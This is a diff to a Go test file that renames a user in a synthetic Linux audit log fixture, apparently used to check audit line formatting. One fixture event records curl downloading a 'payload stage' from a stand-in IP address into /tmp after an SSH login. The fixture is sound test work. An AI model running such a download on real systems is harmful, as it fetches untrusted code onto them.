@@ -16,15 +16,15 @@ import (
 
 func sampleAuditLog() AuditLog {
 	t := time.Date(2024, 3, 15, 9, 10, 0, 250_000_000, time.UTC)
-	login := AuditEvent{User: "alice", UID: 1000, AUID: 1000, Session: 3, PID: 2200, Exe: "/usr/sbin/sshd", Host: "203.0.113.7", Addr: "203.0.113.7", Success: true}
+	login := AuditEvent{User: "user1", UID: 1000, AUID: 1000, Session: 3, PID: 2200, Exe: "/usr/sbin/sshd", Host: "203.0.113.7", Addr: "203.0.113.7", Success: true}
 	auth, logged, start := login, login, login
 	auth.Kind, auth.Time, auth.Terminal = "auth", t, "ssh"
 	logged.Kind, logged.Time, logged.Terminal = "login", t.Add(time.Second), "/dev/pts/0"
 	start.Kind, start.Time, start.Terminal = "session_start", t.Add(2*time.Second), "ssh"
 	return AuditLog{FirstSerial: 4520, Events: []AuditEvent{
 		auth, logged, start,
-		{Kind: "execve", Time: t.Add(time.Minute), User: "alice", UID: 1000, AUID: 1000, Session: 3, PID: 2301, PPID: 2240,
-			Exe: "/usr/bin/curl", Argv: []string{"curl", "-o", "/tmp/x", "http://198.51.100.42/payload stage"}, Cwd: "/home/alice", Key: "exec", TTY: "pts0", Success: true},
+		{Kind: "execve", Time: t.Add(time.Minute), User: "user1", UID: 1000, AUID: 1000, Session: 3, PID: 2301, PPID: 2240,
+			Exe: "/usr/bin/curl", Argv: []string{"curl", "-o", "/tmp/x", "http://198.51.100.42/payload stage"}, Cwd: "/home/user1", Key: "exec", TTY: "pts0", Success: true},
 	}}
 }
 
@@ -83,7 +83,7 @@ func TestAuditLogLines(t *testing.T) {
 	if b, _ := hex.DecodeString(title); string(b) != strings.Join(log.Events[3].Argv, "\x00") {
 		t.Errorf("proctitle %q", title)
 	}
-	if !strings.Contains(lines[0], `acct="alice" exe="/usr/sbin/sshd" hostname=203.0.113.7 addr=203.0.113.7 terminal=ssh res=success'`) {
+	if !strings.Contains(lines[0], `acct="user1" exe="/usr/sbin/sshd" hostname=203.0.113.7 addr=203.0.113.7 terminal=ssh res=success'`) {
 		t.Errorf("USER_AUTH %q", lines[0])
 	}
 }
